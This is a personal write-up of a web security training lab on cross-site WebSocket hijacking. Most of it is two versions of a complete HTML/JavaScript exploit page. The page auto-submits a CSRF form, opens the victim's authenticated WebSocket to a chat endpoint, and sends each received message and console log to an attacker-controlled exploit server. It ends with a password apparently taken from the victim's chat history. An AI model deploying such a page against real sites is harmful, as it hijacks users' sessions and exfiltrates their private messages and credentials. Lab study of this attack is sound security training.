# [WebSockets] Lab: Cross-site WebSocket hijacking (1)

---

![Untitled](%5BWebSockets%5D%20Lab%20Cross-site%20WebSocket%20hijacking%20(1%2017cc6f69f62e4e0e8f5439e1c87f3fbd/Untitled.png)

lets create some chat history then request it 

we need to find away to see what is getting the chat history.

![Untitled](%5BWebSockets%5D%20Lab%20Cross-site%20WebSocket%20hijacking%20(1%2017cc6f69f62e4e0e8f5439e1c87f3fbd/Untitled%201.png)

now I generated a new CSRF payload: 

![Untitled](%5BWebSockets%5D%20Lab%20Cross-site%20WebSocket%20hijacking%20(1%2017cc6f69f62e4e0e8f5439e1c87f3fbd/Untitled%202.png)

![Untitled](%5BWebSockets%5D%20Lab%20Cross-site%20WebSocket%20hijacking%20(1%2017cc6f69f62e4e0e8f5439e1c87f3fbd/Untitled%203.png)

creates new websocket 

my code: 

```jsx
<!DOCTYPE html>
<html>
<head>
    <title>WebSocket and CSRF PoC</title>
</head>
<body>
    <!-- CSRF PoC - generated by Burp Suite Professional -->
    <form action="https://0afa002f047dfe4d812898ee000d00d7.web-security-academy.net/chat" method="get">
        <input type="submit" value="Submit request" />
    </form>

    <script>

		console.log = function(message) {
			// Convert the message to a query string
			var queryParams = new URLSearchParams({log: message}).toString();

			// Your endpoint where the log messages will be sent
			var endpoint = "https://exploit-0ae900b40446fed381b8971101800098.exploit-server.net/log";

			// Send the GET request
			fetch(`${endpoint}?${queryParams}`)
				.then(response => response.text()) // Assuming the response is text
				
				.catch(error => {
					fetch(`${endpoint}?error=${error}`)
					// Note: Since we've overridden console.log, avoid using it here to prevent infinite loops
				});
		};

		// Example usage of the overridden console.log
		console.log("This is a test log message.");

        // Ensure the form is submitted automatically when the page loads
		window.onload = function() {
			setTimeout(function() {
			history.pushState('', '', '/');
			document.forms[0].submit();
			}, 10000); // Delay of 10 seconds
		};

				// WebSocket communication
				// Initialize an array to store received messages
		var receivedMessages = [];

		// WebSocket communication
		// Establish the WebSocket connection
		var ws = new WebSocket('wss://0afa002f047dfe4d812898ee000d00d7.web-security-academy.net/chat');

		ws.onopen = function() {
			console.log("Connection opened");
			ws.send("READY"); // Send initial message to start communication

			// Close the WebSocket connection after 1 minute
			setTimeout(function() {
				ws.close();
				console.log("Connection closed after 1 minute");
			}, 60000); // 60000 milliseconds = 1 minute
		};

		ws.onmessage = function(event) {
			console.log("Received message: " + event.data);

			// Convert the received message to a query string
			var queryParams = new URLSearchParams({message: event.data}).toString();

			// Send the query string to your URL
			fetch(`https://exploit-0ae900b40446fed381b8971101800098.exploit-server.net/log?${queryParams}`)
				.then(response => response.json())
				.then(data => console.log("Data sent successfully:", data))
				.catch(error => console.error('Error:', error));
		};

		ws.onclose = function() {
			console.log("WebSocket connection closed");
		};

		ws.onerror = function(error) {
			console.error("WebSocket Error", error);
		};

	

    </script>
</body>
</html>
```

I didn't like the idea of having a timeout for ten seconds so I decided to change it so that way I can actually just close the websocket after it hasnâ€™t received any messages for more then 5 seconds. 

 

```jsx
<!DOCTYPE html>
<html>
<head>
    <title>WebSocket and CSRF PoC</title>
</head>
<body>
    <!-- CSRF PoC - generated by Burp Suite Professional -->
    <form action="https://0afa002f047dfe4d812898ee000d00d7.web-security-academy.net/chat" method="get">
        <input type="submit" value="Submit request" />
    </form>

    <script>

		console.log = function(message) {
			// Convert the message to a query string
			var queryParams = new URLSearchParams({log: message}).toString();

			// Your endpoint where the log messages will be sent
			var endpoint = "https://exploit-0ae900b40446fed381b8971101800098.exploit-server.net/log";

			// Send the GET request
			fetch(`${endpoint}?${queryParams}`)
				.then(response => response.text()) // Assuming the response is text
				
				.catch(error => {
					fetch(`${endpoint}?error=${error}`)
					// Note: Since we've overridden console.log, avoid using it here to prevent infinite loops
				});
		};

		// Example usage of the overridden console.log
		console.log("This is a test log message.");

        // Ensure the form is submitted automatically when the page loads
		window.onload = function() {
			setTimeout(function() {
			history.pushState('', '', '/');
			document.forms[0].submit();
			}, 10000); // Delay of 10 seconds
		};

				// WebSocket communication
				// Initialize an array to store received messages
		var receivedMessages = [];

		// WebSocket communication
		// Establish the WebSocket connection
		var ws = new WebSocket('wss://0afa002f047dfe4d812898ee000d00d7.web-security-academy.net/chat');

				// WebSocket communication
		var ws = new WebSocket('wss://0afa002f047dfe4d812898ee000d00d7.web-security-academy.net/chat');
		var messageTimeout;

		ws.onopen = function() {
			console.log("Connection opened");
			ws.send("READY"); // Send initial message to start communication
		};

		ws.onmessage = function(event) {
			console.log("Received message: " + event.data);

			// Reset the timeout every time a message is received
			clearTimeout(messageTimeout);
			messageTimeout = setTimeout(function() {
				ws.close();
				console.log("Connection closed due to inactivity");
			}, 5000); // 5000 milliseconds = 5 seconds

			// Convert the received message to a query string and send it
			var queryParams = new URLSearchParams({message: event.data}).toString();
			fetch(`https://exploit-0ae900b40446fed381b8971101800098.exploit-server.net/log?${queryParams}`)
				.then(response => response.json())
				.then(data => console.log("Data sent successfully:", data))
				.catch(error => console.error('Error:', error));
		};

		ws.onclose = function() {
			console.log("WebSocket connection closed");
			clearTimeout(messageTimeout); // Clear the timeout when the connection is closed
		};

		ws.onerror = function(error) {
			console.error("WebSocket Error", error);
			clearTimeout(messageTimeout); // Clear the timeout on error
		};

	

    </script>
</body>
</html>
```

now lets store and deliver exploit to victim with our exploit server: 

**RESULTS:** 

![Untitled](%5BWebSockets%5D%20Lab%20Cross-site%20WebSocket%20hijacking%20(1%2017cc6f69f62e4e0e8f5439e1c87f3fbd/Untitled%204.png)

![Untitled](%5BWebSockets%5D%20Lab%20Cross-site%20WebSocket%20hijacking%20(1%2017cc6f69f62e4e0e8f5439e1c87f3fbd/Untitled%205.png)

`password: p7pdq8pqyo3j2bilw14t`

![Untitled](%5BWebSockets%5D%20Lab%20Cross-site%20WebSocket%20hijacking%20(1%2017cc6f69f62e4e0e8f5439e1c87f3fbd/Untitled%206.png)